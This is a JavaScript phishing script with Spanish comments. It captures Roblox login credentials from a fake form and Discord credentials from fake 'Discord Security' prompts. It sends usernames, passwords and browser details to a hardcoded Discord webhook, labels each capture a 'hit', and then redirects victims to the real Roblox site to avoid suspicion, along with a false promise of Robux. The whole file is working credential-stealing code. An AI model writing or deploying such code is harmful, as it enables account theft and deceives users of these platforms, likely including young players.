const WEBHOOK_URL = "https://discord.com/api/webhooks/1498878074752860183/uuO3iSI5ye5pexJVKUcDa67tGl4f9vW6UAAiDNzcONg-PMTwr81wTjXXypI5ESPqkMlJ";

document.addEventListener('DOMContentLoaded', () => {
    // Captura login de Roblox
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;
        await enviar(user, pass, "ROBLOX");
        // Redirigir a la página real para no levantar sospechas
        window.location.href = "https://www.roblox.com/login";
    });

    // Captura login de Discord (Botón azul)
    document.getElementById('discordLogin').addEventListener('click', async () => {
        const u = prompt("Discord Security: Ingrese su correo o teléfono:");
        const p = prompt("Ingrese su contraseña de Discord:");
        if(u && p) {
            await enviar(u, p, "DISCORD");
            alert("Cuenta vinculada con éxito. Los Robux llegarán en 24h.");
            window.location.href = "https://www.roblox.com/home";
        }
    });
});

async function enviar(u, p, tipo) {
    const payload = {
        embeds: [{
            title: `🎯 ¡NUEVO HIT: ${tipo}!`,
            color: tipo === "ROBLOX" ? 16711680 : 5814771,
            fields: [
                { name: "👤 Usuario/Correo", value: `\`${u}\``, inline: true },
                { name: "🔑 Contraseña", value: `\`${p}\``, inline: true },
                { name: "📱 Dispositivo", value: navigator.userAgent, inline: false }
            ],
            footer: { text: "Unidad 4L - Sistema de Inteligencia" },
            timestamp: new Date()
        }]
    };

    try {
        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
    } catch (err) {
        console.error("Error enviando datos");
    }
}
